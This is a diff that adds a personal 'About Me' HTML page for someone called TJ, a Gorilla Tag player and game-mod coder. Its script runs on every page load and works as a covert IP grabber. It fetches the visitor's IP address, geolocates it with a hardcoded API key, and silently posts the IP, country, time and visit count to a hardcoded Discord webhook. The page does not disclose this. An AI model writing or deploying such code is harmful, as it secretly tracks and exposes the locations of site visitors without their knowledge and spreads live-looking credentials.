@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>About Me</title>
+</head>
+<body>
+    <!-- Display the visitor's IP address at the top -->
+    <h1>Your IP Address: <span id="visitorIp"></span></h1>
+
+    <p>The previous group down below gets their IP address. Thank you.</p>
+    
+    <!-- Rest of the content remains unchanged -->
+    <p>Hello, my name is TJ</p>
+    <p>I'm not going to say my real name for personal reasons and privacy. My hobbies are coding. I learned how to code at a young age, and you won't believe all the things you can do if you just learn simple coding.</p>
+    <p>Besides that, in my free time, I like playing Gorilla Tag. I have grown attached to the community. If you haven't played it, go check it out!</p>
+    <p>After I learned how to code, I started making a lot of things. My most recent project is a mod menu for a game.</p>
+
+    <!-- YouTube link with logo -->
+    <p>Check out my YouTube channel: <a href="https://www.youtube.com/@TJvr-" target="_blank"><img src="images/yu.jpg" alt="YouTube Logo"> @TJvr</a></p>
+
+    <!-- Visit Counter -->
+    <p>This website has been visited <span id="visitCount">0</span> times.</p>
+
+    <script>
+        // JavaScript to increment the visit counter
+        let visitCount = localStorage.getItem('visitCount') || 0;
+        visitCount = parseInt(visitCount) + 1;
+        localStorage.setItem('visitCount', visitCount);
+
+        // Update the counter on the page
+        document.getElementById('visitCount').textContent = visitCount;
+
+        // Get visitor's IP and display it at the top
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                let currentIp = data.ip;
+                document.getElementById('visitorIp').textContent = currentIp; // Display IP at the top
+
+                // Get visitor's location information using IP Geolocation API
+                fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=08ddc3272cd6456cb6c48f5dc5def01a&ip=${currentIp}`)
+                    .then(response => response.json())
+                    .then(locationData => {
+                        let country = locationData.country_name;
+                        let timestamp = new Date().toLocaleString();
+
+                        // Send an embedded message to Discord (replace YOUR_WEBHOOK_URL with your actual webhook URL)
+                        const webhookUrl = 'https://discord.com/api/webhooks/1147964165122707506/R3nTiuZKcUl7IBFfoMYrpcVc7mPDDhnkxEiJ5OADBNyGYOxccu_87c39Aty6GvMF5nZ1';
+                        const data = {
+                            embeds: [
+                                {
+                                    title: 'Visitor Details',
+                                    fields: [
+                                        {
+                                            name: 'IP',
+                                            value: currentIp,
+                                            inline: true,
+                                        },
+                                        {
+                                            name: 'Time',
+                                            value: timestamp,
+                                            inline: true,
+                                        },
+                                        {
+                                            name: 'Country',
+                                            value: country,
+                                            inline: true,
+                                        },
+                                        {
+                                            name: 'Visit Count',
+                                            value: visitCount,
+                                            inline: true,
+                                        },
+                                    ],
+                                },
+                            ],
+                        };
+
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify(data),
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log('Notification sent to Discord.');
+                            } else {
+                                console.error('Failed to send notification to Discord.');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    </script>
+</body>
+</html>
